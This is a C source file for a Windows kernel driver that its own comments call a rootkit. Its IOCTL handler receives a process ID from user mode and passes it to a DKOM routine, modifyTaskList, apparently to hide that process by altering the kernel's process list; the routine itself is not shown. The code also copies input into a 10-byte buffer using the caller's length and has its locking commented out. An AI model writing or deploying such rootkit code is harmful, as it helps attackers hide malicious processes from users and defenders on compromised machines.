#include "driver.h"

// IRP code that will call our rootkit functionality
#define IRP_ROOTKIT_CODE 0x900 

// Default IRP dispatcher, passthrough no action, return STATUS_SUCCESS
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	// Set status as success
	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	// Complete request
	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);

	return(STATUS_SUCCESS);
}

// Handler to recieve IRP request and call Rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION  irpSp;
	ULONG               inBufferLength, outBufferLength, requestcode;
	PCHAR				inBuf;

	// Recieve the IRP stack location from system
	irpSp = IoGetCurrentIrpStackLocation(Irp);

	// Recieve the buffer lengths, and request code
	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestcode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	// Check the request code
	switch (requestcode) {

	case IRP_ROOTKIT_CODE:
	{
		inBuf = Irp->AssociatedIrp.SystemBuffer;
		Irp->IoStatus.Information = inBufferLength;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM: incoming IRP : %s", inBuf));

		// Allocate memory for the PID
		char pid[10];

		// Copy the input buffer into PID
		strcpy_s(pid, inBufferLength, inBuf);

		/* Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
		KIRQL irql;
		PKDPC dpcPtr;
		irql = RaiseIRQL();
		dpcPtr = AquireLock();  */

		// Call our rootkit functionality
		// modifyTaskList in hideprocess.c
		modifyTaskList(atoi(pid));

		/* Release access to the EPROCESS list and exit
		ReleaseLock(dpcPtr);
		LowerIRQL(irql); */

		break;
	}
	default:
	{
		// Set invalid request
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "DKOM Error : STATUS_INVALID_DEVICE_REQUEST\n"));
		break;
	}
	}

	PIRP IrpResponse = Irp;

	// Set status 
	IrpResponse->IoStatus.Status = status;

	// Complete request
	IoCompleteRequest(IrpResponse, IO_NO_INCREMENT);

	return status;
}